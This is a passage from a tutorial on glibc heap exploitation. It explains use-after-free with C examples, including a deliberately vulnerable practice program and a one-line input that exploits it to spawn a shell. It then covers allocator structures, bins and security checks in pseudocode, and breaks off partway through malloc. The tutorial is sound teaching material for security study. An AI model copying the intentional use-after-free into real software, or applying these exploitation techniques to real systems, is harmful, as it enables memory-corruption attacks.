# Heap Exploitation

## Use After Free

The Use After Free or UAF is a vulnerability that arises when a program uses a
variable that was freed. This means that the memory region pointed by that
variable can be used for other purposes, so the utilization of the variable can
lead to unexpected behavior. Here is a little example:

```c
// name-uaf.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
  char *name;
  char *surname;

  name = malloc(strlen("ada") + 1);
  strcpy(name, "ada");

  printf("Name (%p): %s\n", name, name);
  free(name); // Free

  surname = malloc(strlen("pip") + 1);
  strcpy(surname, "pip");

  printf("Name (%p): %s\n", name, name); // UAF
  printf("Surname (%p): %s\n", surname, surname);

  free(surname);
}
```

In this ocassion the variable name is free but used afterwards. Let's check the
output:

```
$ gcc name-uaf.c -o name-uaf
$ ./name-uaf
Name (0x55aca21702a0): ada
Name (0x55aca21702a0): pip
Surname (0x55aca21702a0): pip
```

We can see that the variable `name` change its value unexpectedly. This is
consequence of the memory region pointed by name to be also asigned to `surname`
since `name` was freed. In the output we can appreciate that both variables
point to the same memory address.

It is also important to note that variables `name` and `surname` allocated a
memory chunk of the same size. When the size is similar it is common that the
last free memory chunk is the same as the new allocated one, but in case `name`
and `surname` are very different sizes, this UAF will not cause the overwrite
of `name`, since another chunk different from the one used by `name` will be
provided.

Additionally, in this ocassion the program didn't break or malfunction since the
memory was reassigned to a variable with the same data as `name`, but UAF can
lead to risky vulnerabilities. What happens if for example, instead of `name` we
suffer the UAF in a variable in charge of holding a sensitive value like a
password? We could just rewritte it and that could lead to unauthorized access
for example. It is also possible for an UAF to lead to code execution when we
are able to overwrite a function pointer, like C++ vtables.

To practice, I've created a little game where you control kind of a cloud
application and can create two types of entities, blob and worker, will you be
able to execute the shell? 

```c
// uaf.c
#include <stdlib.h>
#include <stdio.h>

typedef struct _worker {
  long passwd;
  void (*exec_shell)();
} worker;


void exec_shell() {
  system("/bin/sh");
}

worker* new_worker() {
  worker *w;
  w = malloc(sizeof(worker));
  w->passwd = rand(); // Here rand is used to indicate an unknown data
  w->exec_shell = exec_shell;
  return w;
}

typedef struct _blob blob;

typedef struct _blob {
  long data;
  void (*print_data)(blob *b);
} blob;

void print_data(blob *b) {
  printf("Data: %u\n", b->data);
}

blob* new_blob(long data) {
  blob *b;
  b = malloc(sizeof(blob));
  b->data = data;
  b->print_data = print_data;
  return b;
}

int main() {
  worker *w = NULL;
  blob *b = NULL;
  long data = 0;
  int option = 0;

  while (1) {
  fprintf(stderr, "1. Create blob\n");
  fprintf(stderr, "2. Show blob data\n");
  fprintf(stderr, "3. Delete blob\n");
  fprintf(stderr, "4. Create worker\n");
  fprintf(stderr, "5. Execute worker\n");
  fprintf(stderr, "6. Delete worker\n");
  fprintf(stderr, "7. Exit\n");
  
  printf("Option: ");
  fflush(stdout);
  scanf("%d", &option);
  switch(option) {
  case 1:
    if (b) {
      printf("Blob already created\n");
    } else {
      printf("Data for blob: ");
      fflush(stdout);
      scanf("%u", &data);
      b = new_blob(data);
    }
    break;
  case 2:
    if(b) {
      b->print_data(b);
    } else {
      printf("You need to create a blob\n");
    }
    break;
  case 3:
    if (!b) {
      printf("No blob\n");
    } else {
      free(b); // Here is the error
    }
    break;
  case 4:
    if (w) {
      printf("Worker already created\n");
    } else {
      w = new_worker();
    }
    break;
  case 5:
    if (!w) {
      printf("You need to create a worker\n");
    } else {
      printf("Worker pass: ");
      fflush(stdout);
      scanf("%u", &data);

      if (data == w->passwd) {
        w->exec_shell();
      } else {
        printf("Wrong password\n");
      }
    }
    break;
  case 6:
    if(!w) {
      printf("No worker\n");
    } else {
      free(w);
      w = NULL;
    }
    break;
  case 7:
    exit(0);
    break;
  }
  }
  return 0;
}
```

Notice that both `worker` and `blob` structures have the same size. In order to
solve the puzzle, we first need to create a blob and then free it, and since the
program doesn't nullify blob, we can keep using it. Next, we need to create a
worker that will use the same memory chunk, this will allow us to overwrite the
`print_data` pointer of the blob with the address of `exec_shell`, so finally we
can reuse the blob and trigger the shell.

Here is the solution:
```
gcc uaf.c -o uaf
cat <(perl -e 'print "1\n9\n" . "3\n" . "4\n" . "2\n"') - | ./uaf
```

## glibc

### glibc source

The ultimate guide to learn about how the heap is implemented is the glibc
source code. It is important to being able to navigate it since many things
can change between glibc versions, like new protections included, and therefore
it is really difficult to keep everything updated in an external source like
this.

To explore the heap implementation the most relevant file is `malloc/malloc.c`
that contains most of the heap structures and code, such as `__libc_free` and
`__libc_malloc` functions.

We can find the glibc code by versions in the following sources:
- [glibc versions git](https://sourceware.org/git/?p=glibc.git;a=tags) : Select the commit related to the version you want to
  explore and then go to the tree. Here there are the links to some versions:
  + [glibc-2.41](https://sourceware.org/git/?p=glibc.git;a=tree;h=233b87a9d31079928597506e90d217c27786e86b;hb=74f59e9271cbb4071671e5a474e7d4f1622b186f)
  + [glibc-2.39](https://sourceware.org/git/?p=glibc.git;a=tree;h=c4dee33796321547167f05c82b550f7cded262b1;hb=ef321e23c20eebc6d6fb4044425c00e6df27b05f)

- [glibc versions source compressed](https://ftp.gnu.org/gnu/glibc/) : In case you want to download a
  compressed file with the source code for an specific version (faster than `git
  clone`).


### glibc heap concepts

Here are some concepts important to the glibc heap implementation:

- **Heap**: A heap is a contigous big piece of memory where the chunks are
  located. Each arena can have many heaps, but usually there is only one
  per arena. Each heap is represented by a `heap_info` structure.

- **Chunk**: Each chunk is represents a chunk of memory allocated by the user with
  [malloc or similar](https://man.archlinux.org/man/malloc.3.en). Each chunk is represented with the
  `malloc_chunk` structure.

- **Bin**: The bins are lists of freed chunks, usually each one for a different
  size of chunks that allows to classify and retrieve them faster. There are
  five types of bins per arena:
  + **Tcache**: Is a per thread cache that is used to store small chunks to be able
    to retrieve them faster by the same thread. Each Tcache only stores chunks
    of a fixed size and have a limit, usually 10 chunks. Tcaches were introduced
    in version 2.26.
  + **Fast Bin**: A second layer cache that is used after the tcache is full.
  + **Unsorted Bin**: A bin to store chunks with no particular order. It is used as
    cache to store chunks before put them into the large bin, and sometimes into
    the small bin.
  + **Small Bin**: A bin to store small chunks. Each small bin only accept chunks of
    a fixed size and it is used after the tcache and fastbin.
  + **Large Bin**: A bin to store large chunks. Each large bin can store
    chunks of different sizes between the bin range. The chunks are stored in
    decreasing order, being the largest at the beginning of the bin and the
    smaller at the end.

- **Top chunk**: The last chunk of the arena, reduced when required to allocate
  new chunks.

- **Last remainder chunk**: When a chunk is splitted to satisfy a request of a
  smaller size, the remain part is the remainder chunk.
  
- **Arena**: The arena is a concept to group the heap with the bins. It is
  represented by a `malloc_state` struct that contain pointers to bins, and it
  is related to a heap (or more). Over the arenas, the default arena is known as
  main arena and stored in the `main_arena` variable in the BSS segment of glibc.



### glibc heap structures

Here is a list of the most relevant structures used by the heap in glibc. Be
aware that these definitions were taken from version 2.41, so they may change in
other versions (I have put notes in those changes I notice).

> *Note*: The comments that start with more than one `*` or `/` are mine.

The [malloc/arena.c:heap_info](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/arena.c;h=91a4f36232094ec4f842c7cb661d7b61347320e2;hb=HEAD#l67) structure provides information of a particular
heap, including a pointer to the associated arena:

```c
typedef struct _heap_info
{
  mstate ar_ptr; /* Arena for this heap. */
  struct _heap_info *prev; /* Previous heap. */
  size_t size;   /* Current size in bytes. */
  size_t mprotect_size; /* Size in bytes that has been mprotected
                           PROT_READ|PROT_WRITE.  */
  size_t pagesize; /* Page size used when allocating the arena.  */
  /* Make sure the following data is properly aligned, particularly
     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of
     MALLOC_ALIGNMENT. */
  char pad[-3 * SIZE_SZ & MALLOC_ALIGN_MASK];
} heap_info;
```


The [malloc/malloc.c:malloc_state](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=e08873cad50ee9b05bda1eb3b50cef954ff7685a;hb=HEAD#l1823) structure provides information for an
arena, including the pointers for the bins (except tcaches):

```c
struct malloc_state
{
  /* Serialize access.  */
  __libc_lock_define (, mutex);

  /* Flags (formerly in max_fast).  */
  int flags;

  /* Set if the fastbin chunks contain recently inserted free blocks.  */
  /* Note this is a bool but not all targets support atomics on booleans.  */
  int have_fastchunks;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;

  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;

  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];

  /* Bitmap of bins */
  unsigned int binmap[BINMAPSIZE];

  /* Linked list */
  struct malloc_state *next;

  /* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */
  struct malloc_state *next_free;

  /* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */
  INTERNAL_SIZE_T attached_threads;

  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
};
```

The [malloc_chunk](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=5ca390cc225c6513cd106a974e8c6ef1baea3130;hb=d2097651cc57834dbfcaa102ddfacae0d86cfb66#l1138) structure represents the view of a chunk from the
perspective of the glibc library. The memory pointer return by malloc points to
the `fd` field of this `malloc_chunk` structure (note the fd field and below are
just used when the chunk is freed, so there "shouldn't" have any conflicts with
user data):

```c
struct malloc_chunk {

  /*** Begin of CHUNK HEADER ***/

  /// This field space can be used by the previous chunk (in memory) in case
  /// is being used. Otherwise, in case the previous chunk is free, this field
  /// is used to indicate the size of previous chunk.
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free). */

  /// Since the chunk is always aligned with 8 in 32-bits and 16 in 64-bits, the
  /// least significant bits are used as flags:
  /// - P (0x1) (PREV_INUSE): Set if the previous chunk in memory is in use (or
  ///                         in Fastbin or Tcache)
  /// - M (0x2) (IS_MMAPPED): Set if chunk was allocated through mmap
  /// - A (0x4) (NON_MAIN_ARENA): Set if chunk is not in the main arena **/
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */

  /*** End of CHUNK HEADER ***/

  /// The next fields are written in the same space as user data. When malloc
  /// returns a pointer to a chunk, it returns a pointer to the address of its
  /// fd field.

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;
```

The [tcache_perthread_struct](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=e08873cad50ee9b05bda1eb3b50cef954ff7685a;hb=HEAD#l3067) stores the pointers to the tcaches, there is
one per thread and it allocated in one chunk of the arena:
```c
/// Introduced in v2.26
typedef struct tcache_perthread_struct {
  /// Indicates the current number of chunks in each tcache.
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
```

The [tcache_entry](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=5ca390cc225c6513cd106a974e8c6ef1baea3130;hb=d2097651cc57834dbfcaa102ddfacae0d86cfb66#l3112) is a structure stored in each chunk after the chunk header
(in replacement to the fd and bk pointers):

```c
/// Introduced in v2.26
typedef struct tcache_entry {

  struct tcache_entry *next;

  /// Field introduced in v2.29
  /* This field exists to detect double frees.  */
  uintptr_t key;

} tcache_entry;
```

### glibc bins

There are:

- 64 Tcaches per thread
- 10 Fast bins
- 1 Unsorted bin
- 62 Small bins in 64 bits - 63 Small bins in 32 bits
- 64 Large bins in 64 bits - 63 Large bins in 32 bits


#### tcaches

tcaches are bins that allow to cache chunks to be used for the same thread. When
a program requires a chunk, the first place to watch are the tcaches.

Here are some tcache characteristics:

- Available since version 2.26
- LIFO single linked list
- Insertions and removals at HEAD
- All the chunks in a bin have the same size
- Chunk in a tcache is considered as in use, to avoid consolidation
- The `next` member of `tcache_entry` points to the beginning of user_data, not
  the beginning of chunk, and it is obfuscated with safe-linking since version
  2.32
- The `key` member is used to detect double frees. If `key` is set to the key
  value when a chunk is being freed, a double free may happen (additional checks
  are required)

There are 64 tcaches per thread:

- 32-bits: sizes from 12 to 516 bytes (included), with step of 8
- 64-bits: sizes from 24 to 1032 (included), with step of 16

Example of chunks linked in a tcache:
```
                          chunk             chunk             chunk
                      +-----------+     +-----------+     +-----------+
                      | prev_size |     | prev_size |     | prev_size |
                      +-----------+     +-----------+     +-----------+
                      | size 0x10 |     | size 0x10 |     | size 0x10 |
                      +-----------+     +-----------+     +-----------+
tcache.entries[i] --> | next      | --> | next      | --> | next      | --> NULL
                      +-----------+     +-----------+     +-----------+
                      | key       |     | key       |     | key       |
                      +-----------+     +-----------+     +-----------+
                      |    ...    |     |    ...    |     |    ...    |
                      +-----------+     +-----------+     +-----------+

```


#### fast bins

The fast bins are like cache bins for quick access to small chunks. Are mainly
used if the tcaches are empty and before the rest of the bins. Unlike the
tcaches, the same fast bins are available for all the threads.

Here are some of their characteristics:

- LIFO singled linked lists
- Insertions and removals at HEAD
- Are accesible from the `fastbinsY` member of `malloc_state` of an arena
- All the chunks in a bin have the same size
- Chunk in a fast bin is considered as in use, to avoid consolidation
- The `fd` member is obfuscated with safe-linking since version 2.32

There are 10 fast bins:

- 32-bits : sizes from 16 to 88 bytes with a step of 8
- 64-bits : sizes from 32 to 176 bytes with a step of 16, however only the first
  7 are used, until 128 bytes


Example of chunks linked in a fastbin:
```
                      chunk              chunk              chunk
              .-> +-----------+  .-> +-----------+  .-> +-----------+
              |   | prev_size |  |   | prev_size |  |   | prev_size |
              |   +-----------+  |   +-----------+  |   +-----------+
              |   | size 0x20 |  |   | size 0x20 |  |   | size 0x20 |
              |   +-----------+  |   +-----------+  |   +-----------+
fastbinsY[i] -'   | fd        | -'   | fd        | -'   | fd        | --> NULL
                  +-----------+      +-----------+      +-----------+
                  |    ...    |      |    ...    |      |    ...    |
                  +-----------+      +-----------+      +-----------+

```

#### unsorted bin

The unsorted bin is a bin that stores the chunks without a particular
order. Usually large chunks when free are inserted at the head of the unsorted
bin and when a malloc is done, if the unsorted bin is traversed, all the chunks
that do not match the requested size are put in the small bin or large
bin. Therefore the unsorted bin is like a cache for large chunks, that are not
stored in the large bin, which that takes more steps, until the chunk have the
opportunity of being retrieved.

The unsorted bin is checked after the tcache, fast bin and small bin.

Here are some of its characteristics:
- FIFO double linked list
- Insertions at HEAD and removals at TAIL
- The unsorted bin is accessible from the `bins[0]` and `bins[1]` elements from
  `malloc_state` of the arena. The `bins[0]` is the HEAD pointer and the
  `bins[1]` the TAIL pointer
- Any chunk size is allowed to be stored in the unsorted bin
- When the unsorted bin is traversed, all the chunks that do not match the
  requested size are put in small or large bins
- There is 1 unsorted bin (per arena)

Example of chunks linked in a unsorted bin:
```
                 chunk                 chunk                 chunk
         .-> +-----------+ <-. .-> +------------+ <-. .-> +------------+ <-.
         |   | prev_size |   | |   | prev_size  |   | |   | prev_size  |   |
         |   +-----------+   | |   +------------+   | |   +------------+   |
         |   | size 0x90 |   | |   | size 0x420 |   | |   | size 0x560 |   |
         |   +-----------+   | |   +------------+   | |   +------------+   |
bins[0] >'   | fd        | >-|-'   | fd         | >-|-'   | fd         | >-|-.
   ^ ^  >.   +-----------+   |     +------------+   |     +------------+   | |
   | '---|-< | bk        |   '---< | bk         |   '---< | bk         |   | |
   ^     |   +-----------+         +------------+         +------------+   | |
   |     v   |    ...    |         |    ...     |         |    ...     |   | |
   |     |   +-----------+         +------------+         +------------+   | |
   ^     |                                                                 | |
   |     '---->---->---->---->---->---->---->---->---->---->---->---->-----' |
   |                                                                         |
   '---<----<----<----<----<----<----<----<----<----<----<----<----<----<----'
```


#### small bins

The small bins are bins to store little chunks. The small bins are usually
checked after the tcaches and fast bins, and if its required, their chunks can
be splitted.

Here are their characteristics:

- FIFO double linked lists.
- Insertions at HEAD and removals at TAIL
- All the chunks in a bin have the same size
- The small bins are accessible from the `bins[i*2]` and `bins[i*2+1]` elements
  from `malloc_state` of the arena. The `bins[i*2]` is the HEAD pointer and the
  `bins[i*2+1]` the TAIL pointer, being `i` between 1 and 62 (both included)

There are 62 small bins.

- 32-bits : sizes from 16 bytes to 512 (not included), with a step of 8
- 64-bits : sizes from 32 bytes to 1024 (not included), with a step of 16


Example of chunks linked in a small bin:
```
                 chunk                 chunk                 chunk
         .-> +-----------+ <-. .-> +-----------+ <-. .-> +-----------+ <-.
         |   | prev_size |   | |   | prev_size |   | |   | prev_size |   |
         |   +-----------+   | |   +-----------+   | |   +-----------+   |
         |   | size 0x90 |   | |   | size 0x90 |   | |   | size 0x90 |   |
         |   +-----------+   | |   +-----------+   | |   +-----------+   |
bins[i] >'   | fd        | >-|-'   | fd        | >-|-'   | fd        | >-|-.
   ^ ^  >.   +-----------+   |     +-----------+   |     +-----------+   | |
   | '---|-< | bk        |   '---< | bk        |   '---< | bk        |   | |
   ^     |   +-----------+         +-----------+         +-----------+   | |
   |     v   |    ...    |         |    ...    |         |    ...    |   | |
   |     |   +-----------+         +-----------+         +-----------+   | |
   ^     |                                                               | |
   |     '---->---->---->---->---->---->---->---->---->---->---->---->---' |
   |                                                                       |
   '-<----<----<----<----<----<----<----<----<----<----<----<----<----<----'
```

#### large bins

The large bins are bins that store big chunks. Large bins are probably the most
inefficient bin to access, since they can have chunks of different sizes and the
search in large bins is not direct like for example in a small bin. Are usually
the latest bin that is being checked when looking for a chunk.

Here are some of their characteristics:

- Double linked lists
- In a bin the chunks can have different sizes, but all must fit in a range
- Chunks sorted in decreasing order, largest at HEAD and smallest at TAIL
- Removals starts by the TAIL, looking for exatch match, the pointers
  `fd_nextsize` and `bk_nextsize` from `malloc_chunk` struct are used.
- The large bins are accessible from the `bins[i*2]` and `bins[i*2+1]` elements
  from `malloc_state` of the arena. The `bins[i*2]` is the HEAD pointer and the
  `bins[i*2+1]` the TAIL pointer, being `i` between 63 and 126 (both included)

There are 64 large bins:

- 32-bits : Minimum size in first large bin is 512
- 64-bits : Minimum size in first large bin is 1024

The large are distributed in the next way:

- 32 bins with range of 64 bytes
- 16 bins with range of 512 bytes
- 8 bins with range of 4096 bytes
- 4 bins with range of 32768 bytes
- 2 bins with range of 262144 bytes
- 1 bin with range of 
- 1 bin for sizes above 1MB


Example of chunks linked in a large bin:
```
                       chunk                  chunk                    chunk
            .---->+-------------+<-.  .->+-------------+<-.  .--->+-------------+ <--.
            |     | prev_size   |  |  |  | prev_size   |  |  |    | prev_size   |    ^
            |     +-------------+  |  ^  +-------------+  |  |    +-------------+    |
            ^     | size  0x400 |  ^  |  | size 0x400  |  |  ^    | size 0x410  |    |
            |     +-------------+  |  |  +-------------+  ^  |    +-------------+    ^
bins[i] >---|     | fd          |>-|--'  | fd          |>-|--|    | fd          | >--|--.
   ^ ^  >.  ^     +-------------+  ^     +-------------+  |  ^    +-------------+    |  |
   | '---|--|----<| bk          |  |----<| bk          |  '--| --<| bk          |    ^  |
   |     |  |     +-------------+  |     +-------------+     |    +-------------+    |  v
   |     v  |     | fd_nextsize |>-| -.  |     ...     |     ^    | fd_nextsize |>.  |  |
   ^     |  ^     +-------------+  ^  |  +-------------+     |    +-------------+ |  ^  |
   |     |  |  .-<| bk_nextsize |  |  |                      |  .<| bk_nextsize | |  |  v
   |     v  |  |  +-------------+  |  '---->---->---->---->--'  | +-------------+ v  |  |
   ^     |  ^  |  |     ...     |  '---<----<----<----<----<----' |     ...     | |  ^  |
   |     |  |  v  +-------------+                                 +-------------+ |  |  v
   |     v  |  |                                                                  v  |  v
   ^     |  '--|-<----<----<----<----<----<----<----<----<----<----<----<----<----'  |  |
   |     |     |                                                                     ^  |
   |     v     '---->---->---->---->---->---->---->---->---->---->---->---->---->----|  v
   ^     |                                                                           |  |
   |     '---->--->---->---->---->---->---->---->---->---->---->---->---->---->---->-'  |
   |                                                                                    v
   '---<----<----<----<----<----<----<----<----<----<----<----<-----<----<----<----<----'
```


### glibc heap functions

- **malloc**: Maps to [malloc/malloc.c:__libc_malloc](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=5ca390cc225c6513cd106a974e8c6ef1baea3130;hb=d2097651cc57834dbfcaa102ddfacae0d86cfb66#l3464).
- **free**: Maps to [malloc/malloc.c:__libc_free](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=5ca390cc225c6513cd106a974e8c6ef1baea3130;hb=d2097651cc57834dbfcaa102ddfacae0d86cfb66#l3499).

There are many other functions in glibc important to heap, but those change
between versions (even the common `_int_free` was renamed), so it is better for
you to explore the glibc code of the version you want.

However I tried to summarize the `malloc` and `free`. My intention is to provide
an overview of the used algorithm but also identify where the security checks
are performed. These two goals are contradictory in the sense that the overview
tries to simplify the code whereas to correctly show the security checks it is
necessary to show some internals, so my approach here is to avoid hiding
internals like the fields used but also create high level pseudo functions in
those parts where security checks aren't present and the logic can be
summarize.

I have checked that this logic is followed in versions between 2.41 and 2.26
(when tcache was introduced). However, as I said *use it only as guide*, since
many details were removed.

Additionally, some assumptions were made in order to simplify the code:
- The main arena is being used
- The tcache is being used and it is initialized
- The default malloc parameters are being used
- Only one thread is being used


```python
# The free function is a complex one, but in order to follow it more easily,
# here is a summary:
# 1. If fits tcache and this is not full, put in tcache and return
# 2. If fits fastbin, put in fastbin and return
# 3. If previous chunk is not being used, consolidate backwards
# 4. Try next:
# 4.a. If next chunk is top, consolidate with top and go up
# 4.b. If next chunk is not in use, consolidate forward
# 4.c. If chunk fits in smallbin, put in smallbin (since v2.41)
# 4.d. If doesn't fit smallbin, put in unsorted bin
# 5. If large chunk, then malloc_consolidate
# 6. If top chunk too large, return memory to system

def __libc_free(mem):
    if mem == NULL:
        return

    chunk = mem2chunk(mem) # mem - CHUNK_HDR_SZ

    if chunk_is_mmapped(chunk):
        munmap_chunk(chunk)
        return

    chunk_size = chunksize(chunk)

    # SECURITY CHECK (previous v2.23)
    if chunk > -chunk_size or (chunk & MALLOC_ALIGN_MASK) != 0:
        raise "free(): invalid pointer"

    # SECURITY CHECK (previous v2.23)
    if chunk_size < MINSIZE or (chunk_size & MALLOC_ALIGN_MASK) != 0:
        raise "free(): invalid size"

    # if chunk fits in a tcache and that is not full, put it on tcache
    tcache_index = size_to_tcache_index(chunk_size)
    if tcache_index < TCACHE_MAX_BINS:

        entry = chunk2mem(chunk)

        # Safe linking verification. If the key is present, it may be a double
        # free, but it is necessary to verify it (since the key may match with
        # random data)
        if entry.key == tcache_key:
            tmp = tcache.entries[tcache_index]
            count = 0
            # check all tcache chunks looking for anomalies
            while tmp != NULL:

                # SECURITY CHECK (since v2.33)
                if count >= TCACHE_FILL_COUNT:
                    raise "free(): too many chunks detected in tcache"

                # SECURITY CHECK (since v2.32)
                if (tmp & MALLOC_ALIGN_MASK) != 0:
                    raise "free(): unaligned chunk detected in tcache 2"

                # SECURITY CHECK (since v2.29)
                if tmp = entry:
                    raise "free(): double free detected in tcache 2"

                tmp = REVEAL_PTR(tmp->next)
                count += 1

        # insert if the tcache is not full
        if tcache.counts[tcache_index] < TCACHE_FILL_COUNT:
            tcache_put(chunk, tcache_index)
            return


    # if fits, insert into a fastbin
    if chunk_size < get_max_fast():

        # SECURITY CHECK (previous 2.23)
        if chunksize(chunk + chunk_size) <= CHUNK_HDR_SZ or \
           chunksize(chunk + chunk_size) > arena.system_mem:
            raise "free(): invalid next size (fast)"

        arena.have_fastchunks = True
        fastbin_index = size_to_fastbin_index(chunk_size)
        fastbin = arena.fastbinsY[fastbin_index]

        fb_first = *fastbin

        # SECURITY CHECK (previous v2.23)
        # Check that top of fastbin is not the chunk we are going to add,
        # since that means a double free
        if fb_first == chunk:
            raise "double free or corruption (fasttop)"

        # SECURITY CHECK (since v2.32): safe-linking
        # add chunk at the top of fastbin with safe-linking
        chunk.fd = PROTECT_PTR(&(chunk.fd), fb_first)
        *fastbin = chunk

        # SECURITY CHECK (previous v2.23)
        if fb_first != NULL and \
           size_to_fastbin_index(chunksize(fb_first)) != fastbin_index:
            raise "invalid fastbin entry (free)"
        return


    next_chunk = chunk + chunk_size

    # SECURITY CHECK (previous v2.23)
    # Check whether the block is already the top block
    if chunk == arena.top:
        raise "double free or corruption (top)"

    # SECURITY CHECK (previous v2.23)
    # Check if next chunk is beyond the boundaries of the arena.
    if next_chunk >= (arena.top + chunksize(arena.top)):
        raise "double free or corruption (out)"

    # SECURITY CHECK (previous v2.23)
    # Check if chunk is actually not marked as used
    if not (next_chunk.mchunk_size & PREV_INUSE):
        raise "double free or corruption (!prev)"

    # SECURITY CHECK (previous v2.23)
    if chunksize(next_chunk) <= CHUNK_HDR_SZ or \
       chunksize(next_chunk) >= arena.system_mem:
        raise "free(): invalid next size (normal)"

    # Consolidate backward
    # if previous chunk in memory is not been used, remove from bin and
    # consolidate with it
    if not prev_inuse(chunk):
        chunk_size += chunk.mchunk_prev_size
        prev = chunk - chunk.mchunk_prev_size

        # SECURITY CHECK (since v2.29)
        if chunksize(prev) != chunk.mchunk_prev_size:
            raise "corrupted size vs. prev_size while consolidating"

        unlink_chunk(prev)
        chunk = prev


    if next_chunk != arena.top:

        next_in_use = (next_chunk + chunksize(next_chunk)).mchunk_size | PREV_INUSE

        # Consolidate with next chunk
        if not next_in_use:
            unlink_chunk(next_chunk)
            chunk_size += chunksize(next_chunk)

        # otherwise, indicate that our current chunk is not used
        # (Note that when in a tcache or fastbin, a chunk is considered used to
        # avoid consolidation)
        else:
            next_chunk.mchunk_size &= ~PREV_INUSE

        # Check if put the chunk into smallbin or unsorted bin.
        # This condition appears in v2.41. In previous versions all the chunks
        # were put at unsorted bin in this step.
        
        # If doesn't fit smallbin, put in unsorted bin
        if not in_smallbin_range(chunk_size):
            bin = arena.bins[0]

            # SECURITY CHECK (previous v2.23)
            if bin.fd.bk != bin:
                raise "free(): corrupted unsorted chunks"

            chunk.fd_nextsize = NULL
            chunk.bk_nextsize = NULL

        # If fits, put into a small bin (since v2.41)
        else:
            sb_index = size_to_smallbin_index(chunk_size)
            bin = arena.bins[sb_index]

            # SECURITY CHECK (since v2.41)
            if bin.fd.bk != bin:
                raise "free(): chunks in smallbin corrupted"

            # mark smallbin as used in binmap
            arena.binmap[idx2block(sb_index)] |= idx2bit(sb_index)

        # link to selected bin
        chunk.bk = bin
        chunk.fd = bin.fd
        bin.fd = chunk
        bin.fd.bk = chunk
        chunk.mchunk_size |= PREV_INUSE
        (chunk + chunk_size).mchunk_prev_size = chunk_size

    # Consolidate into top
    else:
        chunk_size = chunk_size + chunksize(next_chunk)
        chunk.mchunk_size = chunk_size | PREV_INUSE
        arena.top = chunk

    # In case of a "large" chunk being freed, put fastbin chunks into unsorted
    # bin and try to return memory to the system.
    if chunk_size > FASTBIN_CONSOLIDATION_THRESHOLD:

        # take fastbin chunks, consolidate those with next and previous chunks
        # if possible, and put them into the unsorted bin
        malloc_consolidate()

        # return memory to the system
        if chunksize(top) >= TRIM_THRESHOLD:
            systrim(TOP_PAD)

    return

```

```python
# This is the `malloc` function, that allows to retrieve chunks from the heap
# It is a complex function but here is a summary:
# 1. Try to take chunk from tcache
# 2. Try to take chunk from fastbin, and put the rest of fastbin chunks into
#    tcache
# 3. Try to take from smallbin, and put the rest of smallbin chunks into
#    tcache
# 4. If a large request was done, do malloc_consolidate
# 5. Try to take from unsorted bin, and put chunks in tcache, smallbin, or
#    largebin
# 6. Try to take from large bin and split if necessary
# 7. Try to take from small bin and split if necessary (note that the
#    previous attempt to take from small bin was done only by exact match)
# 8. Try one of the following:
# 8.a. If enough space, use the top chunk (by splitting it)
# 8.b. If there are fastbins, use malloc_consolidate. Because of this
#      the outern while True loop is required since new chunks can be
#      moved to unsorted bin (note that the previous malloc consolidate only
#      is done if large request).
# 8.c. As last resort, take memory from the system
def __libc_malloc(bytes):

    chunk_size = request2size(bytes)

    # if size fits in a tcache and that is not empty, retrieve chunk
    tcache_index = size_to_tcache_index(chunk_size)
    if tcache_index < TCACHE_MAX_BINS and \
       tcache.counts[tcache_index] > 0:
       tc_entry = tcache.entries[tcache_index]

        # SECURITY CHECK (since v2.32)
        if (tc_entry & MALLOC_ALIGN_MASK) != 0:
            raise "malloc(): unaligned tcache chunk detected"

        # SECURITY CHECK (v2.32): unlink chunk from tcache with safe-linking
        *tcache.entries[tcache_index] = REVEAL_PTR(tc_entry.next)
        tcache->counts[tcache_index] -= 1

        # SECURITY CHECK (since v2.29): clean tcache key
        tc_entry.key = 0

        # the tcache entries points to the user data (not the chunk header)
        # so we can just return it
        mem = tc_entry
        return mem

    # if size fits in a fastbin and that is not empty, retrieve chunk
    # and put the rest of the chunks into tcache (untill is full)
    if chunk_size < get_max_fast():
        fb_idx = size_to_fastbin_index(chunk_size)
        fastbin = arena.fastbinsY[fb_idx]
        chunk = *fastbin
        if chunk != NULL:

            # SECURITY CHECK (since v2.32)
            if misaligned_chunk(chunk):
                raise "malloc(): unaligned fastbin chunk detected 2"

            # SECURITY CHECK (since v2.32): unlink from fastbin with
            # safe-linking
            *fastbin = REVEAL_PTR(chunk.fd)

            # SECURITY CHECK (previous v2.23)
            if fb_idx != size_to_fastbin_index(chunksize(chunk)):
                raise "malloc(): memory corruption (fast)"

            # optimization:
            # move the rest of fastbin chunks to the corresponding tcache
            if tcache_index < TCACHE_MAX_BINS:
                while tcache.counts[tcache_index] < TCACHE_FILL_COUNT and \
                    (tc_chunk = *fastbin) != NULL:

                    # SECURITY CHECK (since v2.32)
                    if misaligned_chunk(tc_chunk):
                        raise "malloc(): unaligned fastbin chunk detected 3"

                    # SECURITY CHECK (since v2.32):  unlink from fastbin with
                    # safe-linking
                    *fastbin = REVEAL_PTR(tc_chunk.fd)

